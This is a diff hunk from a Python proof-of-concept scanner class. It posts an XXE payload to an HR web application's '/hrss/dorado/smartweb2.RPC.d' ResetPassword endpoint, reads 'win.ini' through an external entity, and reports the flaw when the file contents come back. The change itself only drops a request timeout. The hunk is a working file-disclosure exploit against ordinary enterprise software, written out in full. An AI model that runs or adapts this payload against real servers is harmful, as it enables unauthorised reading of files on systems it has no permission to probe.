@@ -46,7 +46,7 @@ class poc:
         url = "{}://{}/hrss/dorado/smartweb2.RPC.d?__rpc=true".format(scheme, netloc)
         data = '__viewInstanceId=nc.bs.hrss.rm.ResetPassword~nc.bs.hrss.rm.ResetPasswordViewModel&__xml=<!DOCTYPE z [<!ENTITY Password SYSTEM "file:///C://windows//win.ini" >]><rpc transaction="10" method="resetPwd"><vps><p name="__profileKeys">%26Password;</p ></vps></rpc>'
         try:
-            result = requests.post(url=url, data=data, proxies=self.proxies, headers=self.headers, verify=False, timeout=3)
+            result = requests.post(url=url, data=data, proxies=self.proxies, headers=self.headers, verify=False)
             if "for 16-bit app support" in result.text:
                 target = urlparse(url)
                 self.result_text += """\n        [+]    \033[32m检测到目标站点存在XML外部实体注入漏洞\033[0m
